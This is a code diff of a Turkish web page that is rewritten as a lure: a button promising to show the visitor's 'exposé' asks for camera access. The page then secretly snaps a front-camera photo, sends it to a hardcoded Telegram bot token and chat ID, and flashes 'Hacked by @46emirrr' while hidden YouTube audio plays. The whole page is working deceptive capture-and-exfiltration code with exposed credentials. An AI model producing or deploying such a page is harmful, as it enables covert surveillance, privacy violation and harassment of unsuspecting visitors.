@@ -1,38 +1,73 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>Telegram Botuna Kamera Görüntüsü</title>
+  <meta charset="UTF-8" />
+  <title>İzin Ver ve Fotoğraf Çek</title>
   <style>
     body { font-family: sans-serif; text-align: center; padding: 40px; }
     video, canvas { display: none; }
+    button { padding: 10px 20px; font-size: 18px; cursor: pointer; }
+    #mesaj { margin-top: 20px; font-weight: bold; color: green; }
+    #hackedFlash {
+      font-size: 48px;
+      font-weight: bold;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      animation: flashColors 1s infinite alternate;
+      z-index: 9999;
+      pointer-events: none;
+      user-select: none;
+    }
+    @keyframes flashColors {
+      0% { color: black; background-color: white; }
+      100% { color: white; background-color: black; }
+    }
   </style>
 </head>
 <body>
-  <h2>📷 Kamera görüntüsü alınacak ve Telegram botuna gönderilecek</h2>
-  <p>Lütfen kamera izni verin.</p>
+
+  <h2>📷 İfşanı görmek için lütfen izin ver</h2>
+  <button id="izinButton">İfşanı görmek için izin ver</button>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
+  <div id="mesaj"></div>
+  <div id="hackedFlash" style="display:none;">Hacked by @46emirrr</div>
+
+  <!-- YouTube arka plan müziği (2:48'den başlar) -->
+  <iframe
+    width="0"
+    height="0"
+    src="https://www.youtube.com/embed/w_S98XbQmPY?autoplay=1&loop=1&playlist=w_S98XbQmPY&controls=0&mute=0&start=168"
+    frameborder="0"
+    allow="autoplay"
+    allowfullscreen
+    style="display:none;">
+  </iframe>
 
   <script>
     const TELEGRAM_BOT_TOKEN = "7996559452:AAFUZHzo4URmpsKOXVemh5EkLWvzv-BWQTg";
     const CHAT_ID = "5012869228";
 
-    async function captureAndSendToTelegram() {
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const ctx = canvas.getContext("2d");
+    const izinButton = document.getElementById("izinButton");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    const mesaj = document.getElementById("mesaj");
+    const hackedFlash = document.getElementById("hackedFlash");
+
+    izinButton.addEventListener("click", async () => {
+      izinButton.style.display = "none";
+      mesaj.textContent = "";
+      hackedFlash.style.display = "none";
 
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
-        });
-
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
-        // 2 saniye bekle
-        await new Promise(resolve => setTimeout(resolve, 2000));
+        await new Promise(r => setTimeout(r, 2000));
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -51,21 +86,22 @@
           });
 
           if (res.ok) {
-            alert("📤 Fotoğraf Telegram'a gönderildi!");
+            mesaj.textContent = "sey";
+            hackedFlash.style.display = "block";
           } else {
-            alert("❌ Gönderim başarısız.");
+            mesaj.textContent = "❌ Gönderim başarısız.";
+            izinButton.style.display = "inline-block";
           }
 
-          // Kamerayı durdur
           stream.getTracks().forEach(track => track.stop());
         }, "image/png");
 
       } catch (err) {
-        alert("Kamera erişimi alınamadı: " + err.message);
+        mesaj.textContent = "Kamera erişimi alınamadı: " + err.message;
+        izinButton.style.display = "inline-block";
       }
-    }
-
-    window.onload = captureAndSendToTelegram;
+    });
   </script>
+
 </body>
 </html>
